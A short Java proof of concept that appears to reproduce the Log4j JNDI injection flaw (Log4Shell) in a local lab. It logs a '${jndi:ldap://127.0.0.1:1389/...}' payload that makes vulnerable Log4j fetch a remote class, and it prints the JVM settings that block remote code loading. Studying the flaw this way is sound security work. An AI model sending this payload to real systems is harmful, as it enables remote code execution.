
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;

/**
 * @author: Sparks
 * @Date: 2021/12/12 14:09
 * @Description
 */
public class Main {

    private static final Logger log = LogManager.getLogger(Main.class);

    public static void main(String[] args) throws IOException {
        log.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
        //Runtime.getRuntime().exec("calc");
        // 当java.rmi.server.useCodebaseOnly = true时,不允许执行远程代码
        String property = System.getProperty("java.rmi.server.useCodebaseOnly");
        System.out.println(property);

        // com.sun.jndi.ldap.object.trustURLCodebase=false 不执行远程代码
        String property1 = System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase");
        System.out.println(property1);
    }
}
